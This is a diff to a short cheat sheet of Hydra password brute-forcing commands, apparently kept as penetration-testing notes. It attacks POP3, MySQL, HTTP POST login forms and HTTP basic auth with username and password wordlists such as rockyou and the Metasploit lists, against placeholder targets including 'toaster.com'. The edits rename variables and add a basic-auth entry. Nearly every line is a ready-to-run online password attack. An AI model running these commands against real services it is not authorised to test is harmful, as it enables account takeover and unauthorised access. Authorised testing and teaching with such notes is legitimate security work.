@@ -1,14 +1,16 @@
 # hydra: online password attacks
 
-# pop3
-hydra -L userlist.txt -P passwordfile.txt $ip pop3
+# POP3
+hydra -L userlist.txt -P passwordfile.txt $IP pop3
 
-# guess mysql password
-hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt $ip mysql
+# MySQL
+hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt $IP mysql
 
-# http post form
-hydra -l user -P /usr/share/dirb/wordlists/small.txt $host http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:Login failed" -V
+# HTTP post form
+PORT=80
+SERVER=toaster.com
+hydra -l user -P /usr/share/dirb/wordlists/small.txt $HOST http-post-form "/login.php:user=^USER^&pass=^PASS^&submit=Login:Login failed" -V
+hydra -l user -P $WORDLIST -s $PORT $SERVER http-post-form "/:password=^PASS^&submit=Submit:Invalid" -V
 
-port=80
-server=toaster.com
-hydra -l user -P /usr/share/wordlists/rockyou.txt -s $port $server http-post-form "/:password=^PASS^&submit=Submit:Invalid" -V
+# HTTP basic auth
+hydra -l admin -P $WORDLIST $DOMAIN http-get /v2/
